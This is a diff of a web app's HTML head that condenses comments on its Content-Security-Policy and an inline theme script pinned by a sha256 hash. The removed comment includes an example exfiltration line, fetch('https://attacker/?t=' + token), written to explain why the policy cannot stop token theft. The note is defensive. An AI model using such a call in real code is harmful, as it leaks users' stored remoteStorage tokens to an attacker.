@@ -4,29 +4,15 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <!--
-      Content-Security-Policy. Defense-in-depth for issue #79: we store
-      remoteStorage tokens in localStorage, so any XSS would be catastrophic.
-      The app loads no third-party JS today; this meta tag formalises that.
+      CSP — defense-in-depth for issue #79 (rs.js tokens live in localStorage).
+      The inline script below is pinned by sha256; csp.test.js verifies the
+      hash matches the body so editing the script fails the test with the new
+      hash to paste in.
 
-      Honest scope: this CSP blocks inline-script injection, eval, base-tag
-      hijacking, plugin embeds, cross-origin form posts, and PWA manifest
-      takeover. It does NOT close the token-exfiltration channel on its own —
-      `connect-src https:` is wide open by necessity (rs.js connects to
-      whichever remoteStorage server the user picks, and that origin isn't
-      known until runtime). An XSS that gets past everything else can still
-      `fetch('https://attacker/?t=' + token)`. Tightening this further needs
-      a deploy-time header that pins connect-src to the discovered host.
-
-      Per-directive notes:
-        - script-src pins a sha256 of the inline theme script below. If you
-          edit that script, recompute the hash or the page refuses to run it.
-        - style-src keeps 'unsafe-inline' because Svelte 5 injects component
-          CSS at runtime and components use dynamic `style="..."` props.
-        - manifest-src allows blob: because pwa-icon.js generates the PWA
-          manifest as a Blob URL (see src/lib/pwa-icon.js).
-        - frame-ancestors / report-to / sandbox are intentionally omitted —
-          meta-tag CSPs ignore them. Set frame-ancestors and X-Frame-Options
-          via an HTTP header at deploy time.
+      connect-src https: stays wide open — rs.js dials user-chosen remotes —
+      so this does NOT block token exfiltration on its own. frame-ancestors,
+      sandbox, and report-to are ignored in <meta> CSP; set them as HTTP
+      headers at deploy.
     -->
     <meta
       http-equiv="Content-Security-Policy"
@@ -41,8 +27,8 @@
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
     <meta name="theme-color" content="#e15b37" />
-    <!-- SYNC: key + resolution logic duplicated from src/lib/theme.svelte.js to avoid FOITC -->
-    <!-- CSP-HASH: if you change the script body, update sha256 in the CSP meta above -->
+    <!-- SYNC: key + resolution logic duplicated from src/lib/theme.svelte.js to avoid FOITC. -->
+    <!-- Editing this body changes the sha256 in the CSP above; csp.test.js will fail with the new hash. -->
     <script>
       try {
         var p = localStorage.getItem("setlist-roller-theme") || "system";
